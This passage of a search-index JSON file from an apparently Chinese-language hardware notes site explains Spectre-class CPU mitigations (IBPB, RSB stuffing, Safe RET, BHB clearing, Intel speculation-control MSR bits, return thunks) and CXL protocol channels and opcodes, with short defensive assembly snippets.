Barrier\uff0c\u200b\u4fdd\u8bc1\u200b Barrier \u200b\u4e4b\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b Barrier \u200b\u4e4b\u540e\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> <li>\u200b\u8fd9\u4e2a\u200b Barrier \u200b\u901a\u8fc7\u200b\u5199\u5165\u200b MSR <code>IA32_PRED_CMD.IBPB = 0</code> \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u6ca1\u6709\u200b\u5f15\u5165\u200b\u65b0\u200b\u7684\u200b\u6307\u4ee4\u200b</li> <li>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0cIBRS \u200b\u53ea\u200b\u8003\u8651\u200b\u4e86\u200b\u7528\u6237\u200b\u6001\u5bf9\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u6ca1\u6709\u200b\u8003\u8651\u200b\u7528\u6237\u200b\u6001\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u7531\u200b IBPB \u200b\u6765\u200b\u8865\u8db3\u200b</li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#rsb-fillingstuffing","title":"RSB filling/stuffing","text":"<ul> <li>Retpoline</li> <li>\u200b\u7531\u4e8e\u200b Return Stack Buffer \u200b\u5728\u200b\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u6765\u200b\u9884\u6d4b\u200b\u76ee\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u7f13\u89e3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u63d0\u524d\u200b\u5411\u200b Return Stack Buffer \u200b\u586b\u5145\u200b\u4e00\u4e9b\u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u51fa\u73b0\u200b Underflow \u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u53eb\u200b RSB filling/stuffing\uff1a     <pre><code>.rept 16\n    call 1f\n    pause\n    lfence\n\n    1:\n.endr\naddq $(8 * 16), %rsp\n</code></pre></li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#safe-ret","title":"Safe RET","text":"<ul> <li>Safe RET \u200b\u548c\u200b Retpoline \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u8981\u200b\u5f3a\u8feb\u200b ret \u200b\u88ab\u200b\u9884\u6d4b\u200b\u5230\u200b\u6307\u5b9a\u200b\u7684\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u907f\u514d\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u9884\u6d4b\u200b\u7684\u200b\u5730\u5740\u200b</li> <li>\u200b\u4f46\u200b Safe RET \u200b\u8981\u200b\u89e3\u51b3\u200b\u7684\u200b\u662f\u200b Speculative Return Stack Overflow \u200b\u6f0f\u6d1e\u200b\u4e2d\u200b\uff0cBTB \u200b\u51fa\u73b0\u200b alias \u200b\u7684\u200b\u95ee\u9898\u200b</li> <li>\u200b\u56e0\u6b64\u200b Safe RET \u200b\u7684\u200b\u89e3\u51b3\u529e\u6cd5\u200b\u662f\u200b\uff0c\u200b\u4e3b\u52a8\u200b\u6784\u9020\u200b BTB alias\uff0c\u200b\u5148\u200b\u628a\u200b\u653b\u51fb\u8005\u200b\u4ece\u200b BTB \u200b\u4e2d\u200b\u5237\u6389\u200b\uff0c\u200b\u518d\u200b\u53bb\u200b\u8fdb\u884c\u200b\u5b9e\u9645\u200b\u7684\u200b ret</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#software-bhb-clearing","title":"Software BHB Clearing","text":"<ul> <li>Software BHB\uff08Branch History Buffer\uff09Clearing \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u9632\u6b62\u200b\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u63a7\u5236\u200b\u7684\u200b BHB \u200b\u6765\u200b\u8fdb\u884c\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b</li> <li>\u200b\u56e0\u6b64\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\u5c31\u662f\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u8c03\u7528\u200b\u8db3\u591f\u200b\u6b21\u6570\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u4f7f\u5f97\u200b BHB \u200b\u4e2d\u200b\u7531\u200b\u7528\u6237\u200b\u6001\u200b\u8bbe\u7f6e\u200b\u7684\u200b\u90e8\u5206\u200b\u88ab\u200b\u5237\u6389\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u7528\u4e8e\u200b\u5185\u6838\u200b\u6001\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b BHB \u200b\u662f\u200b\u5b89\u5168\u200b\u7684\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#intel-msr","title":"Intel MSR","text":"<ul> <li>Intel \u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\u5f88\u591a\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\u7684\u200b\u63a7\u5236\u200b\u90fd\u200b\u548c\u200b\u4e24\u4e2a\u200b MSR \u200b\u6709\u5173\u200b\uff1aIA32_SPEC_CTRL \u200b\u548c\u200b IA32_PRED_CMD\uff0c\u200b\u8fd9\u91cc\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\u5b83\u4eec\u200b\u7684\u200b\u5404\u4e2a\u200b\u5b57\u200b\u6bb5\u200b\uff1a</li> <li>IA32_SPEC_CTRL:<ul> <li>[0]: IBRS, Indirect Branch Restricted Speculation\uff0c\u200b\u9694\u79bb\u200b\u7528\u6237\u200b\u6001\u200b\u548c\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> <li>[1]: STIBP, Single Thread Indirect Branch Predictor\uff0c\u200b\u9694\u79bb\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> <li>[2]: SSBD\uff0cSpeculative Store Bypass Disable\uff0c\u200b\u7b49\u200b\u5148\u524d\u200b\u7684\u200b\u6240\u6709\u200b\u7684\u200b store \u200b\u5730\u5740\u200b\u5df2\u77e5\u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b load</li> <li>[3]: IPRED_DIS_U\uff0cIndirect Predictor Disable User\uff0c\u200b\u7528\u6237\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7b49\u5230\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u88ab\u200b\u5b9e\u9645\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u540e\u200b\u624d\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b\u6267\u884c\u200b</li> <li>[4]: IPRED_DIS_S\uff0cIndirect Predictor Disable Supervisor\uff0c\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7b49\u5230\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u88ab\u200b\u5b9e\u9645\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u540e\u200b\u624d\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b\u6267\u884c\u200b</li> <li>[5]: RRSBA_DIS_U\uff0cRestricted Return Stack Buffer Alternate User\uff0c\u200b\u7528\u6237\u200b\u6001\u4e0b\u200b\uff0c\u200b\u5f53\u200b Return Stack Buffer \u200b\u4e3a\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u9884\u6d4b\u200b</li> <li>[6]: RRSBA_DIS_S\uff0cRestricted Return Stack Buffer Alternate Supervisor\uff0c\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u5f53\u200b Return Stack Buffer \u200b\u4e3a\u7a7a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7981\u6b62\u200b\u9884\u6d4b\u200b</li> <li>[7]: PSFD\uff0c\u200b\u7981\u6b62\u200b Fast Store Forwarding Predictor</li> <li>[8]: DDPD_U\uff0c\u200b\u7528\u6237\u200b\u6001\u4e0b\u200b\u7981\u6b62\u200b Data Dependent Prefetcher</li> <li>[10]: BHI_DIS_S\uff0cBranch History Injection Disable Supervisor\uff0c\u200b\u9694\u79bb\u200b\u7528\u6237\u200b\u6001\u200b\u548c\u200b\u5185\u6838\u200b\u6001\u200b\u7528\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u5206\u652f\u200b\u5386\u53f2\u200b</li> </ul> </li> <li>IA32_PRED_CMD:<ul> <li>[0]: IPBP\uff0cIndirect Branch Prediction Barrier\uff0c\u200b\u963b\u6b62\u200b Barrier \u200b\u524d\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u5f71\u54cd\u200b Barrier \u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#__user-pointer-sanitization","title":"__user pointer sanitization","text":"<ul> <li>[PATCH v6 13/13] x86/spectre: report get_user mitigation for spectre_v1</li> <li>\u200b\u5185\u6838\u200b\u5728\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6dfb\u52a0\u200b barrier \u200b\u4ee5\u200b\u907f\u514d\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#untrained-return-thunk","title":"untrained return thunk","text":"<ul> <li> <p>\u200b\u4e3a\u4e86\u200b\u907f\u514d\u200b ret \u200b\u88ab\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5229\u7528\u200b x86 \u200b\u6307\u4ee4\u96c6\u200b\u7f16\u7801\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u4f7f\u5f97\u200b ret \u200b\u6307\u4ee4\u200b\u88ab\u200b\u89e3\u91ca\u200b\u4e3a\u200b\u975e\u200b ret \u200b\u6307\u4ee4\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u518d\u200b\u53bb\u200b\u6267\u884c\u200b\u8fd9\u200b\u6761\u200b ret \u200b\u6307\u4ee4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5b83\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u9884\u6d4b\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7279\u522b\u200b\u7684\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\u5982\u4e0b\u200b\uff08\u200b\u5bf9\u5e94\u200b Linux \u200b\u7684\u200b <code>retbleed_untrain_ret</code> \u200b\u51fd\u6570\u200b\uff09\uff1a</p> <pre><code>1:\n.byte 0xf6\n2:\nret\nint 3\nlfence\njmp 2b\nint 3\n</code></pre> </li> <li> <p>\u200b\u8fd9\u200b\u6bb5\u200b\u4ee3\u7801\u200b\u4ece\u200b <code>1:</code> \u200b\u5904\u200b\u5f00\u59cb\u200b\u6267\u884c\u200b\uff0c\u200b\u7531\u4e8e\u200b <code>test $0xcc, %bl</code> \u200b\u7684\u200b\u7f16\u7801\u200b\u548c\u200b <code>.byte 0xf6; ret; int3</code> \u200b\u6307\u4ee4\u200b\u76f8\u540c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u7684\u200b\u8bed\u4e49\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b <code>test $0xcc, %bl; lfence; jmp 2b</code>\uff1b\u200b\u7136\u540e\u200b\u8df3\u8f6c\u200b\u5230\u200b <code>2:</code> \u200b\u5904\u200b\u7684\u200b ret \u200b\u6307\u4ee4\u200b</p> </li> <li>\u200b\u5728\u200b\u6267\u884c\u200b <code>test $0xcc, %bl</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u628a\u200b <code>ret</code> \u200b\u6307\u4ee4\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u975e\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e4b\u540e\u200b\u518d\u200b\u53bb\u200b\u6267\u884c\u200b\u5b83\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9884\u6d4b\u5668\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u6f0f\u6d1e\u200b\u7684\u200b\u5229\u7528\u200b</li> </ul>"},{"location":"hardware/cxl.html","title":"CXL (Compute Express Link)","text":"<p>CXL \u200b\u7684\u200b\u6807\u51c6\u200b\u662f\u200b\u516c\u5f00\u200b\u4e0b\u8f7d\u200b\u7684\u200b\uff1ahttps://www.computeexpresslink.org/download-the-specification\uff0c\u200b\u4e0b\u6587\u200b\u53c2\u8003\u200b\u7684\u200b\u662f\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u200b 1 \u200b\u65e5\u200b\u7684\u200b CXL 3.0 \u200b\u7248\u672c\u200b\u3002</p>"},{"location":"hardware/cxl.html#cxl","title":"CXL \u200b\u8bbe\u5907\u200b\u7c7b\u578b","text":"<p>CXL \u200b\u5bf9\u200b PCIe \u200b\u7684\u200b\u91cd\u8981\u200b\u7684\u200b\u6269\u5c55\u200b\uff0c\u200b\u4e00\u662f\u200b\u5728\u4e8e\u200b\u8ba9\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u548c\u200b CPU \u200b\u5b9e\u73b0\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\uff08CXL.cache\uff09\uff0c\u200b\u4e8c\u662f\u200b\u53ef\u4ee5\u200b\u505a\u200b\u8fdc\u7a0b\u200b\u7684\u200b\u5185\u5b58\u200b\uff08CXL.mem\uff09\u3002</p> <p>\u200b\u5177\u4f53\u200b\u4e0b\u6765\u200b\uff0cCXL \u200b\u6807\u51c6\u200b\u4e3b\u8981\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e09\u7c7b\u200b\u8bbe\u5907\u200b\uff1a</p> <ul> <li>CXL Type 1: \u200b\u8bbe\u5907\u200b\u5e26\u6709\u200b\u4e0e\u200b CPU \u200b\u4e00\u81f4\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b CXL.io \u200b\u548c\u200b CXL.cache</li> <li>CXL Type 2: \u200b\u8bbe\u5907\u200b\u5e26\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u5185\u5b58\u200b\u548c\u200b\u4e0e\u200b CPU \u200b\u4e00\u81f4\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b CXL.io\uff0cCXL.cache \u200b\u548c\u200b CXL.mem</li> <li>CXL Type 3: \u200b\u8bbe\u5907\u200b\u5e26\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u5b9e\u73b0\u200b CXL.io \u200b\u548c\u200b CXL.mem</li> </ul>"},{"location":"hardware/cxl.html#cxl_1","title":"CXL \u200b\u4f20\u8f93\u5c42","text":""},{"location":"hardware/cxl.html#cxlio","title":"CXL.io","text":"<p>CXL.io \u200b\u57fa\u672c\u4e0a\u200b\u5c31\u662f\u200b PCIe \u200b\u534f\u8bae\u200b\uff1a</p> <pre><code>CXL.io provides a non-coherent load/store interface for I/O devices. Figure\n3-1 shows where the CXL.io transaction layer exists in the Flex Bus layered\nhierarchy. Transaction types, transaction packet formatting, credit-based\nflow control, virtual channel management, and transaction ordering rules\nfollow the PCIe* definition; please refer to the \u201cTransaction Layer\nSpecification\u201d chapter of PCIe Base Specification for details. This chapter\nhighlights notable PCIe operational modes or features that are used for\nCXL.io.\n</code></pre> <p>CXL 3.0 \u200b\u901f\u5ea6\u200b\u662f\u200b 64.0 GT/s\uff0c\u200b\u4f7f\u7528\u200b PAM4 \u200b\u7f16\u7801\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b PCIe 6.0\u3002</p>"},{"location":"hardware/cxl.html#cxlcache","title":"CXL.cache","text":"<p>CXL.cache \u200b\u6bcf\u4e2a\u200b\u65b9\u5411\u200b\u4e0a\u200b\u6709\u200b\u4e09\u4e2a\u200b channel\uff1a\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u54cd\u5e94\u200b\u548c\u200b\u6570\u636e\u200b\u3002\u200b\u8003\u8651\u200b\u5230\u200b Host \u200b\u548c\u200b Device \u200b\u7684\u200b\u4f20\u8f93\u200b\u65b9\u5411\u200b\uff0c\u200b\u5c31\u662f\u200b\u516d\u4e2a\u200b channel\uff1aD2H Req\uff0cD2H Resp\uff0cD2H Data\uff0cH2D Req\uff0cH2D Resp\uff0cH2D Data\u3002\u200b\u5728\u200b Data channel \u200b\u4e0a\u200b\u4f20\u8f93\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u5927\u5c0f\u200b\u662f\u200b 64 \u200b\u5b57\u8282\u200b\u3002</p> <p>CXL.cache \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b MESI\u3002</p> <p>CXL.cache \u200b\u4f20\u8f93\u200b\u6709\u200b\u4e09\u79cd\u200b\u6a21\u5f0f\u200b\uff1a68B Flit\uff0c256B Flit \u200b\u548c\u200b PBR Flit\u3002</p> <p>H2D Request \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li><code>Address[51:6]</code>: \u200b\u7269\u7406\u5730\u5740\u200b</li> <li>UQID: Unique Queue ID</li> <li>CacheID: Only in 256B Flit</li> <li>SPID/DPID: Only in PBR Flit</li> </ul> <p>D2H Response \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li>UQID: Unique Queue ID</li> <li>DPID: Only in PBR Flit</li> </ul> <p>D2H Data \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>UQID: Unique Queue ID</li> <li>ChunkValid: Only in 68B Flit</li> <li>Bogus</li> <li>Poison: data is corrupted</li> <li>BEP: Only in 256B Flit &amp; PBR Flit</li> <li>DPID: Only in PBR Flit</li> </ul> <p>D2H Request \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li>CQID: Command Queue ID</li> <li>NT: Non Temporal</li> <li>CacheID: Only in 256B Flit</li> <li>Address: 46 \u200b\u4f4d\u200b\u7269\u7406\u5730\u5740\u200b</li> <li>SPID/DPID: Only in PBR Flit</li> </ul> <p>H2D Response \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>Opcode</li> <li>RspData</li> <li>RSP_PRE</li> <li>CQID: Command Queue ID</li> <li>CacheID: Only in 256B Flit</li> <li>DPID: Only in PBR Flit</li> </ul> <p>H2D Data \u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ul> <li>Valid</li> <li>CQID: Command Queue ID</li> <li>ChunkValid: Only in 68B Flit</li> <li>Bogus</li> <li>GO-Err</li> <li>CacheID: Only in 256B Flit</li> <li>DPID: Only in PBR Flit</li> </ul>"},{"location":"hardware/cxl.html#_1","title":"\u8bf7\u6c42\u200b\u7c7b\u578b","text":"<p>\u200b\u9996\u5148\u200b\u8003\u8651\u200b Host \u200b\u4f1a\u200b\u53d1\u9001\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u7b2c\u4e00\u79cd\u200b\u662f\u200b SnpData\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b Host \u200b\u5728\u200b\u8bfb\u53d6\u200b\u7684\u200b\u65f6\u5019\u200b\u51fa\u73b0\u200b\u7f3a\u5931\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u5411\u200b Device \u200b\u53d1\u9001\u200b Snoop\uff0c\u200b\u83b7\u53d6\u200b\u6700\u65b0\u200b\u7684\u200b Dirty \u200b\u7684\u200b Data\uff0c\u200b\u6216\u8005\u200b\u8ba9\u200b Device \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u964d\u7ea7\u200b\u4e3a\u200b Shared \u200b\u72b6\u6001\u200b\u3002</p> <p>Device \u200b\u6536\u5230\u200b SnpData \u200b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u7f13\u5b58\u200b\u884c\u4e0d\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff08\u200b\u72b6\u6001\u200b\u662f\u200b I\uff09\uff0c\u200b\u4f1a\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b RspIHitI\uff1b\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u4e14\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b\uff08\u200b\u72b6\u6001\u200b\u662f\u200b S \u200b\u6216\u8005\u200b E\uff09\uff0c\u200b\u964d\u7ea7\u200b\u5230\u200b S\uff0c\u200b\u4f1a\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b RspSHitSE\uff1b\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u662f\u200b dirty\uff08\u200b\u72b6\u6001\u200b\u662f\u200b M\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u964d\u7ea7\u200b\u5230\u200b S\uff0c\u200b\u7136\u540e\u200b\u56de\u590d\u200b RspSFwdM \u200b\u4ee5\u53ca\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u53d8\u6210\u200b Invalid\uff0c\u200b\u56de\u590d\u200b RspIFwdM \u200b\u4ee5\u53ca\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u4e9b\u200b D2H Response \u200b\u7684\u200b Opcode \u200b\u7684\u200b\u540d\u5b57\u200b\u683c\u5f0f\u200b\u5f88\u200b\u6709\u200b\u89c4\u5f8b\u200b\uff0c<code>Rsp+A+Hit/Fwd+B</code>\uff0cA \u200b\u8868\u793a\u200b\u65b0\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0cB \u200b\u662f\u200b\u539f\u6765\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0cHit \u200b\u4e0d\u200b\u9644\u5e26\u200b\u6570\u636e\u200b\uff0cFwd \u200b\u9644\u5e26\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u7b2c\u4e8c\u79cd\u200b\u662f\u200b SnpInv\uff0c\u200b\u4f8b\u5982\u200b Host \u200b\u8981\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5c31\u8981\u200b invalidate \u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u3002Device \u200b\u6536\u5230\u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ef\u80fd\u200b\u8fd4\u56de\u200b RspIHitI\u3001RspIHitSE \u200b\u548c\u200b RspIFwdM\uff0c\u200b\u5206\u522b\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u521d\u59cb\u72b6\u6001\u200b\uff0c\u200b\u6700\u7ec8\u200b\u90fd\u200b\u662f\u200b Invalid \u200b\u6001\u200b\u3002</p> <p>\u200b\u7b2c\u4e09\u79cd\u200b\u662f\u200b SnpCur\uff0c\u200b\u83b7\u53d6\u200b\u5f53\u524d\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u3002Device \u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u3002\u200b\u53ef\u80fd\u200b\u7684\u200b\u8fd4\u56de\u200b\u6709\u200b RspIHitI\uff0cRspVHitV\uff0cRspSHitSE\uff0cRspSFwdM\uff0cRspIFwdM \u200b\u548c\u200b RspVFwdV\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b V \u200b\u8868\u793a\u200b Valid\uff0c\u200b\u5bf9\u5e94\u200b MESI \u200b\u4e2d\u200b\u7684\u200b MES \u200b\u4e09\u79cd\u200b\u72b6\u6001\u200b\u3002\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u7684\u8bdd\u200b\uff0c\u200b\u5c31\u662f\u200b RspIHitI\uff0cRspVHitV \u200b\u548c\u200b RspVFwdV \u200b\u4e09\u79cd\u200b\u54cd\u5e94\u200b\u3002</p> <p>\u200b\u518d\u200b\u8003\u8651\u200b Device \u200b\u4f1a\u200b\u53d1\u9001\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u9996\u5148\u200b\uff0c\u200b\u8bf7\u6c42\u200b\u53ef\u4ee5\u200b\u5206\u4e3a\u200b\u56db\u7c7b\u200b\uff1a</p> <ol> <li>Read\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response \u200b\u548c\u200b H2D Data</li> <li>Read0\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response</li> <li>Write\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response\uff0c\u200b\u53d1\u9001\u200b D2H Data\uff0c\u200b\u53ef\u200b\u9009\u200b\u63a5\u6536\u200b H2D Response</li> <li> <p>Read0-Write\uff1a\u200b\u53d1\u9001\u200b D2H Request\uff0c\u200b\u63a5\u6536\u200b H2D Response\uff0c\u200b\u53d1\u9001\u200b D2H Data</p> </li> <li> <p>RdCurr(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u4e0d\u200b\u9020\u6210\u200b\u4efb\u4f55\u200b\u7684\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u7684\u200b\u4fee\u6539\u200b\u3002Device \u200b\u7f13\u5b58\u200b\u8fd8\u662f\u200b\u5904\u4e8e\u200b Invalid \u200b\u72b6\u6001\u200b\u3002</p> </li> <li>RdOwn(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b E \u200b\u6001\u200b\u6216\u8005\u200b M \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I/GO-E/GO-M\u3002</li> <li>RdShared(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u8fdb\u5165\u200b S \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I/GO-S\u3002</li> <li>RdAny(Read)\uff0cDevice \u200b\u8bfb\u53d6\u200b Host \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u8fdb\u5165\u200b M \u200b\u6001\u200b\uff0cE \u200b\u6001\u200b\u6216\u200b S \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I/GO-S/GO-E/GO-M\u3002</li> <li>RdOwnNoData(Read0)\uff0cDevice 